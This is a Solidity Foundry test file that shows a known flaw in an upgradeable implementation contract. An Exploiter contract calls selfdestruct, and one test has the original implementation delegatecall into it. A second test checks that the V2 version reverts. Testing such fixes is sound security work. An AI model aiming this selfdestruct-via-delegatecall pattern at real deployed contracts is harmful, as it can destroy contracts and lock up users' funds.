// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Test} from "forge-std/Test.sol";
import {Implementation} from "../src/Implementation.sol";
import {ImplementationV2} from "../src/ImplementationV2.sol";

contract Exploiter {
    function exploit(address payable to_) external {
        selfdestruct(to_);
    }
}

contract ImplementationsTest is Test {
    Implementation private impl;
    ImplementationV2 private implV2;

    function setUp() public {
        impl = new Implementation();
        implV2 = new ImplementationV2();
        // There's no need to deploy the proxy
    }

    /* NOTE:
        `selfdestruct` is recorded in the transaction substate, which means that the result
        will be only visible once the transaction is over. Here we've stopped to
        one limitation of Foundry, preventing us to test this effectively.
    */

    function test_ExploitsTheOriginalImplementation() public {
        bytes memory exploitSig = abi.encodeWithSignature("exploit(address)", msg.sender);
        impl.delegatecallContract(address(new Exploiter()), exploitSig);
    }

    function test_TriesToExploitTheV2() public {
        bytes memory exploitSig = abi.encodeWithSignature("exploit(address)", msg.sender);
        address exploiterAddr = address(new Exploiter());
        vm.expectRevert(ImplementationV2.NotDelegated.selector);
        implV2.delegatecallContract(exploiterAddr, exploitSig);
    }
}
